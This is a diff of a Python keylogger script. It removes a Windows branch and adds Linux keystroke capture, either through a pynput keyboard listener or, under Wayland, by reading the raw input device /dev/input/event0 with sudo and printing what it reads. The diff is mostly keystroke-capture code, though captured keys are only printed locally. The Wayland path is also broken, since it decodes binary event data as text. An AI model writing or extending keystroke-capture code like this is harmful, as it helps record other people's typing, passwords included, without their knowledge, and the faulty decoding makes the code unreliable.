@@ -20,12 +20,12 @@ def get_host_info():
     return platform.system()
 
 def keylog_linux():
-    if os.environ.get("XDG_SESSION_TYPE") == "wayland":
-        print("Wayland is not supported. Please use X11.")
-        sys.exit(1)
-    listener = keyboard.Listener(on_press=keylog)
-    listener.start()
-    listener.join()
+    device = "/dev/input/event0"
+    print(f"Using device: {device}")
+    process = subprocess.Popen(["sudo", "cat", device], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    for line in process.stdout:
+        print(line.decode())
+
 
 def keylog(key):
     print(str(key))
@@ -44,11 +44,13 @@ def keylog(key):
             
 if __name__ == "__main__":
     get_host_info()
-    if platform.system() == "Windows":
-        subprocess.Popen("notepad.exe logs.txt")
-        listener = keyboard.Listener(on_press=keylog)
-        listener.start()
-        listener.join()
+    if platform.system() == "Linux":
+        if os.environ.get("XDG_SESSION_TYPE") == "wayland":
+            keylog_linux()
+        else:
+            listener = keyboard.Listener(on_press=keylog)
+            listener.start()
+            listener.join()
     
     input()
 
